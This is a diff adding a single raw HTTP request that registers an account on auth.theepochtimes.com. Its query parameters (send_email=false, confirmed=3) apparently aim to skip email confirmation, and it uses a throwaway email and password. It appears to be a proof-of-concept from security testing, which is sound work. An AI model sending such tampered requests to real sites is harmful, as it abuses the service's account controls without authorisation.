@@ -1,0 +1,18 @@
+POST /user/registration?site=www.theepochtimes.com&send_email=false&confirmed=3 HTTP/1.1
+Host: auth.theepochtimes.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/json; charset=UTF-8
+Content-Length: 62
+Origin: https://subs.theepochtimes.com
+Dnt: 1
+Referer: https://subs.theepochtimes.com/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Te: trailers
+Connection: close
+
+{"email":"theepochhomedepot@google.com","password":"asdfg123"}
